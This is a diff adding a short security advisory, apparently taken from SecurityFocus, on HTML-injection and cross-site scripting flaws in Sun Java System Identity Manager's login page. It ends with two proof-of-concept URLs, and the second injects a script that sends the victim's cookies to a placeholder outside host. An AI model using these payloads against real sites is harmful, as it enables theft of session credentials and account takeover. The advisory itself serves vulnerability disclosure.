@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/27214/info
+
+Sun Java System Identity Manager is prone to multiple input-validation vulnerabilities, including an HTML-injection issue and cross-site scripting issues, because it fails to adequately sanitize user-supplied input.
+
+Attackers can exploit these issues to execute arbitrary HTML and script code in the context of the affected site. Successful exploits could allow an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+Sun Java System Identity Manager 6.0 SP1, 6.0 SP2, 6.0 SP3, 7.0, and 7.1 are vulnerable. 
+
+https://www.example.com/idm/login.jsp?lang=en&cntry=--><textarea>THIS+IS+MY+INJECTED+HTML&lt;/textarea&gt;<!--
+https://www.example.com/idm/login.jsp?lang=--><script>window.location="http://www.example2.com/?"+document.cookie</script><!--&cntry=
